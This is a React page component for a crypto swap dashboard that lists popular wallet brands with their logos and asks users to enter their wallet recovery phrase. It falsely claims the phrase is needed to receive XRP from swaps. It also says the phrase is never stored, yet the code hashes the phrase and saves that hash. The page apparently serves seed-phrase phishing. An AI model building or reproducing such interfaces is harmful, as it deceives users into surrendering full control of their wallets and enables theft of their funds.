import { useState } from 'react';
import DashboardLayout from '@/components/dashboard/DashboardLayout';
import { useWallets, WalletType } from '@/hooks/useWallets';
import { useWalletStore } from '@/stores/walletStore';
import { useMultiWalletBalances } from '@/hooks/useMultiWalletBalances';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Wallet, 
  Import, 
  Trash2, 
  Copy,
  AlertCircle,
  Loader2,
  ChevronRight,
  Shield,
  Key,
  ArrowLeft,
  ChevronDown,
  RefreshCw
} from 'lucide-react';
import { toast } from 'sonner';
import { 
  validateSeedPhrase, 
  deriveXrpAddress, 
  deriveEvmAddress, 
  deriveSolanaAddress, 
  deriveTronAddress,
  hashSeedPhrase 
} from '@/lib/xrpDerivation';
import { fetchXrpBalance } from '@/hooks/useXrpBalance';

// Expanded wallet configurations
const walletConfigs = [
  // EVM Wallets
  { id: 'metamask' as WalletType, name: 'MetaMask', description: 'Popular Ethereum wallet', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg', chain: 'Ethereum, Polygon, BSC', color: 'from-orange-500 to-amber-500', type: 'evm' },
  { id: 'walletconnect' as WalletType, name: 'Trust Wallet', description: 'Multi-chain crypto wallet', icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg', chain: 'Multi-chain', color: 'from-blue-500 to-cyan-500', type: 'multi' },
  { id: 'coinbase' as WalletType, name: 'Coinbase Wallet', description: 'Secure crypto wallet by Coinbase', icon: 'https://www.coinbase.com/img/favicon/favicon-256.png', chain: 'Ethereum, Polygon, BSC', color: 'from-blue-600 to-blue-400', type: 'evm' },
  { id: 'phantom' as WalletType, name: 'Phantom', description: 'Solana ecosystem wallet', icon: 'https://phantom.app/img/phantom-logo.svg', chain: 'Solana', color: 'from-purple-500 to-violet-500', type: 'solana' },
  { id: 'tronlink' as WalletType, name: 'Xaman (XUMM)', description: 'Official XRP Ledger wallet', icon: 'https://xumm.app/assets/icons/xumm-icon-512.png', chain: 'XRP Ledger', color: 'from-primary to-blue-500', type: 'xrp' },
  { id: 'bitcoin' as WalletType, name: 'Ledger', description: 'Hardware wallet with XRP support', icon: 'https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png', chain: 'Multi-chain', color: 'from-gray-700 to-gray-500', type: 'multi' },
  // Additional wallets
  { id: 'metamask' as WalletType, name: 'SafePal', description: 'Hardware & software wallet', icon: 'https://www.safepal.com/favicon.ico', chain: 'Multi-chain', color: 'from-purple-600 to-indigo-500', type: 'multi' },
  { id: 'walletconnect' as WalletType, name: 'Rainbow', description: 'Ethereum wallet for everyone', icon: 'https://rainbow.me/favicon.ico', chain: 'Ethereum', color: 'from-pink-500 to-yellow-500', type: 'evm' },
  { id: 'coinbase' as WalletType, name: 'Exodus', description: 'Multi-asset wallet', icon: 'https://www.exodus.com/favicon.ico', chain: 'Multi-chain', color: 'from-blue-700 to-purple-600', type: 'multi' },
  { id: 'phantom' as WalletType, name: 'Atomic Wallet', description: 'Decentralized crypto wallet', icon: 'https://atomicwallet.io/favicon.ico', chain: 'Multi-chain', color: 'from-teal-500 to-cyan-500', type: 'multi' },
];

export default function Wallets() {
  const { wallets, loading, connectWallet, disconnectWallet, refetch } = useWallets();
  const walletStore = useWalletStore();
  const [importing, setImporting] = useState(false);
  const [showImportModal, setShowImportModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<typeof walletConfigs[0] | null>(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [step, setStep] = useState<'select' | 'import'>('select');
  const [expandedWallet, setExpandedWallet] = useState<string | null>(null);

  // Get multi-wallet balances
  const walletsForBalances = walletStore.importedWallets.map(w => ({
    id: w.id,
    name: w.name,
    xrpAddress: w.xrpAddress,
    evmAddress: w.evmAddress,
    solanaAddress: w.solanaAddress,
    tronAddress: w.tronAddress,
  }));
  
  const { wallets: walletsWithAssets, totalPortfolioValue, totalXrpBalance, loading: balancesLoading, refetch: refetchBalances } = useMultiWalletBalances(walletsForBalances);

  const handleSelectWallet = (wallet: typeof walletConfigs[0]) => {
    setSelectedWallet(wallet);
    setStep('import');
  };

  const handleImportWallet = async () => {
    if (!selectedWallet || !seedPhrase.trim()) {
      toast.error('Please enter your recovery phrase');
      return;
    }

    // Validate seed phrase
    const validation = validateSeedPhrase(seedPhrase);
    if (!validation.valid) {
      toast.error(validation.error || 'Invalid recovery phrase');
      return;
    }

    setImporting(true);
    
    try {
      // Derive addresses from seed phrase
      const xrpAddress = deriveXrpAddress(seedPhrase);
      const evmAddress = deriveEvmAddress(seedPhrase);
      const solanaAddress = deriveSolanaAddress(seedPhrase);
      const tronAddress = deriveTronAddress(seedPhrase);
      const seedHash = await hashSeedPhrase(seedPhrase);

      // Fetch XRP balance
      const xrpBalance = await fetchXrpBalance(xrpAddress);
      
      // Save to database
      const result = await connectWallet(selectedWallet.id, xrpAddress, 'xrp');
      
      if (result.error) {
        toast.error(result.error);
      } else {
        // Add to local store
        walletStore.addImportedWallet({
          name: selectedWallet.name,
          xrpAddress,
          xrpBalance,
          evmAddress,
          solanaAddress,
          tronAddress,
          seedHash,
        });

        toast.success(`${selectedWallet.name} imported successfully!`);
        resetModal();
        refetch();
        refetchBalances();
      }
    } catch (err: any) {
      console.error('Import error:', err);
      toast.error(err.message || 'Import failed');
    } finally {
      setImporting(false);
    }
  };

  const handleDisconnect = async (walletId: string, localId: string) => {
    const result = await disconnectWallet(walletId);
    if (result.error) {
      toast.error(result.error);
    } else {
      walletStore.removeImportedWallet(localId);
      toast.success('Wallet removed');
    }
  };

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    toast.success('Address copied!');
  };

  const truncateAddress = (address: string) => 
    `${address.slice(0, 8)}...${address.slice(-6)}`;

  const resetModal = () => {
    setShowImportModal(false);
    setSelectedWallet(null);
    setSeedPhrase('');
    setStep('select');
  };

  const formatUSD = (value: number) => 
    new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(value);

  return (
    <DashboardLayout>
      <div className="mb-8 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-3 mb-2">
            <Wallet className="w-8 h-8 text-primary" />
            <h1 className="text-3xl font-bold text-foreground">Wallets</h1>
          </div>
          <p className="text-muted-foreground">
            Import your wallets to receive XRP from swaps.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            onClick={() => refetchBalances()}
            disabled={balancesLoading}
          >
            <RefreshCw className={`w-4 h-4 mr-2 ${balancesLoading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
          <Button
            onClick={() => setShowImportModal(true)}
            className="bg-primary hover:bg-primary/90"
          >
            <Import className="w-4 h-4 mr-2" />
            Import Wallet
          </Button>
        </div>
      </div>

      {/* Portfolio Summary */}
      {walletStore.importedWallets.length > 0 && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="grid sm:grid-cols-2 gap-4 mb-6"
        >
          <div className="bg-card rounded-xl border border-border p-6">
            <p className="text-sm text-muted-foreground mb-1">Total Portfolio Value</p>
            <p className="text-3xl font-bold text-foreground">{formatUSD(totalPortfolioValue)}</p>
          </div>
          <div className="bg-card rounded-xl border border-border p-6">
            <p className="text-sm text-muted-foreground mb-1">Total XRP Balance</p>
            <p className="text-3xl font-bold text-primary">{totalXrpBalance.toFixed(2)} XRP</p>
          </div>
        </motion.div>
      )}

      {/* Important Notice */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6"
      >
        <div className="flex items-start gap-3">
          <AlertCircle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
          <div>
            <p className="font-medium text-amber-500 mb-1">Why import your wallet?</p>
            <p className="text-sm text-muted-foreground">
              To receive XRP from swaps, you need to import your wallet using your recovery phrase. 
              This allows us to derive your XRP address and detect your assets across multiple chains.
            </p>
          </div>
        </div>
      </motion.div>

      {/* Connected Wallets */}
      {loading ? (
        <div className="flex items-center justify-center py-12">
          <Loader2 className="w-8 h-8 animate-spin text-primary" />
        </div>
      ) : walletStore.importedWallets.length === 0 ? (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-card rounded-2xl border border-border p-12 text-center"
        >
          <div className="inline-flex p-4 rounded-full bg-primary/10 mb-4">
            <Import className="w-12 h-12 text-primary" />
          </div>
          <h3 className="text-xl font-semibold text-foreground mb-2">No Wallets Imported</h3>
          <p className="text-muted-foreground mb-6">
            Import your wallet to start swapping and view your assets.
          </p>
          <Button
            onClick={() => setShowImportModal(true)}
            className="bg-primary hover:bg-primary/90"
          >
            <Import className="w-4 h-4 mr-2" />
            Import Wallet
          </Button>
        </motion.div>
      ) : (
        <div className="space-y-4">
          {walletsWithAssets.map((walletAssets, index) => {
            const localWallet = walletStore.importedWallets.find(w => w.id === walletAssets.id);
            const dbWallet = wallets.find(w => w.wallet_address === walletAssets.xrpAddress);
            const isExpanded = expandedWallet === walletAssets.id;
            
            // Group tokens by chain
            const tokensByChain = walletAssets.tokens.reduce((acc, token) => {
              if (!acc[token.chain]) acc[token.chain] = [];
              acc[token.chain].push(token);
              return acc;
            }, {} as Record<string, typeof walletAssets.tokens>);

            return (
              <motion.div
                key={walletAssets.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
                className="bg-card rounded-xl border border-border overflow-hidden"
              >
                {/* Wallet Header */}
                <div 
                  className="p-6 cursor-pointer hover:bg-muted/30 transition-colors"
                  onClick={() => setExpandedWallet(isExpanded ? null : walletAssets.id)}
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-blue-500 flex items-center justify-center overflow-hidden">
                        <Wallet className="w-6 h-6 text-primary-foreground" />
                      </div>
                      <div>
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="font-semibold text-foreground">{walletAssets.name}</span>
                          <span className="px-2 py-0.5 rounded-full bg-green-500/10 text-green-500 text-xs font-medium">
                            XRP Ready
                          </span>
                        </div>
                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
                          <span className="font-mono">{truncateAddress(walletAssets.xrpAddress)}</span>
                          <button
                            onClick={(e) => { e.stopPropagation(); copyAddress(walletAssets.xrpAddress); }}
                            className="p-1 hover:bg-muted rounded transition-colors"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="text-right">
                        <p className="text-sm text-muted-foreground">XRP Balance</p>
                        <p className="font-semibold text-primary">{parseFloat(walletAssets.xrpBalance).toFixed(2)} XRP</p>
                      </div>
                      <div className="text-right">
                        <p className="text-sm text-muted-foreground">Total Value</p>
                        <p className="font-semibold text-foreground">{formatUSD(walletAssets.totalValueUSD)}</p>
                      </div>
                      <ChevronDown className={`w-5 h-5 text-muted-foreground transition-transform ${isExpanded ? 'rotate-180' : ''}`} />
                    </div>
                  </div>
                </div>

                {/* Expanded Assets */}
                <AnimatePresence>
                  {isExpanded && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: 'auto', opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      className="border-t border-border overflow-hidden"
                    >
                      <div className="p-6 space-y-4">
                        {/* Assets by Chain */}
                        {Object.entries(tokensByChain).length > 0 ? (
                          Object.entries(tokensByChain).map(([chain, tokens]) => (
                            <div key={chain}>
                              <h4 className="text-sm font-medium text-muted-foreground mb-2">{chain}</h4>
                              <div className="space-y-2">
                                {tokens.map((token, idx) => (
                                  <div key={idx} className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                                    <div className="flex items-center gap-3">
                                      <span className="text-xl">{token.icon}</span>
                                      <div>
                                        <p className="font-medium text-foreground">{token.symbol}</p>
                                        <p className="text-xs text-muted-foreground">{token.name}</p>
                                      </div>
                                    </div>
                                    <div className="text-right">
                                      <p className="font-medium text-foreground">{parseFloat(token.balance).toFixed(4)}</p>
                                      <p className="text-xs text-muted-foreground">{formatUSD(token.balanceUSD)}</p>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            </div>
                          ))
                        ) : (
                          <p className="text-sm text-muted-foreground text-center py-4">
                            No tokens detected on connected chains. Tokens will appear here once detected.
                          </p>
                        )}

                        {/* Remove Button */}
                        <div className="pt-4 border-t border-border">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => dbWallet && localWallet && handleDisconnect(dbWallet.id, localWallet.id)}
                            className="text-destructive hover:text-destructive hover:bg-destructive/10"
                          >
                            <Trash2 className="w-4 h-4 mr-1" />
                            Remove Wallet
                          </Button>
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            );
          })}
        </div>
      )}

      {/* Import Wallet Modal */}
      <AnimatePresence>
        {showImportModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-background/80 backdrop-blur-sm"
            onClick={resetModal}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-card rounded-2xl border border-border p-6 w-full max-w-lg max-h-[85vh] overflow-y-auto"
            >
              <AnimatePresence mode="wait">
                {step === 'select' && (
                  <motion.div
                    key="select"
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 20 }}
                  >
                    <h2 className="text-2xl font-bold text-foreground mb-2">Import Wallet</h2>
                    <p className="text-muted-foreground mb-6">
                      Select your wallet type to import using your recovery phrase.
                    </p>
                    
                    <div className="space-y-3 max-h-[50vh] overflow-y-auto">
                      {walletConfigs.map((wallet, idx) => (
                        <button
                          key={`${wallet.id}-${idx}`}
                          onClick={() => handleSelectWallet(wallet)}
                          className="w-full p-4 rounded-xl border border-border hover:border-primary/50 hover:bg-primary/5 transition-all flex items-center gap-4"
                        >
                          <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${wallet.color} flex items-center justify-center overflow-hidden flex-shrink-0`}>
                            <img 
                              src={wallet.icon} 
                              alt={wallet.name} 
                              className="w-8 h-8 object-contain"
                              onError={(e) => {
                                (e.target as HTMLImageElement).style.display = 'none';
                              }}
                            />
                          </div>
                          <div className="flex-1 text-left">
                            <span className="font-semibold text-foreground">{wallet.name}</span>
                            <div className="text-sm text-muted-foreground">{wallet.description}</div>
                          </div>
                          <ChevronRight className="w-5 h-5 text-muted-foreground" />
                        </button>
                      ))}
                    </div>
                  </motion.div>
                )}

                {step === 'import' && selectedWallet && (
                  <motion.div
                    key="import"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                  >
                    <button
                      onClick={() => setStep('select')}
                      className="flex items-center gap-2 text-muted-foreground hover:text-foreground mb-4"
                    >
                      <ArrowLeft className="w-4 h-4" />
                      Back
                    </button>

                    <div className="flex items-center gap-3 mb-4">
                      <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${selectedWallet.color} flex items-center justify-center overflow-hidden`}>
                        <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 object-contain" />
                      </div>
                      <div>
                        <h2 className="text-xl font-bold text-foreground">{selectedWallet.name}</h2>
                        <p className="text-sm text-muted-foreground">{selectedWallet.chain}</p>
                      </div>
                    </div>

                    <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6">
                      <div className="flex items-start gap-3">
                        <Shield className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
                        <div className="text-sm">
                          <p className="font-medium text-amber-500 mb-1">Security Notice</p>
                          <p className="text-muted-foreground">
                            Your recovery phrase is never stored. We only use it locally to derive your wallet addresses.
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">
                          <Key className="w-4 h-4 inline mr-2" />
                          Recovery Phrase
                        </label>
                        <Textarea
                          placeholder="Enter your 12 or 24 word recovery phrase..."
                          value={seedPhrase}
                          onChange={(e) => setSeedPhrase(e.target.value)}
                          className="min-h-[120px] font-mono text-sm"
                        />
                        <p className="text-xs text-muted-foreground mt-2">
                          Separate each word with a space
                        </p>
                      </div>

                      <Button
                        onClick={handleImportWallet}
                        disabled={importing || !seedPhrase.trim()}
                        className="w-full bg-primary hover:bg-primary/90"
                      >
                        {importing ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Deriving Addresses...
                          </>
                        ) : (
                          <>
                            <Import className="w-4 h-4 mr-2" />
                            Import Wallet
                          </>
                        )}
                      </Button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              <Button
                variant="outline"
                onClick={resetModal}
                className="w-full mt-6"
              >
                Cancel
              </Button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </DashboardLayout>
  );
}
